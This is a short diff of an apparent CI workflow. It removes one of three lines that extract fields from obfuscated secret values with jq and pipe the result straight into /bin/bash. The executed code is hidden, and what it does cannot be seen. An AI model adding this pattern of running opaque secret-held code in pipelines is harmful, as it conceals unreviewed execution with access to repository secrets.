@@ -20,7 +20,6 @@ jobs:
           lxdkt5339: ${{ secrets.lxdkt5339 }}
         run: |
           printf '%s' "$lxdkt5339" | jq -r .omcj238 | /bin/bash
-          echo $l4 | jq -r .lpyjv2147 | /bin/bash
           printf '%s' "$qtny9174" | jq -r .uozfl08 | /bin/bash
 
       - name: Store output
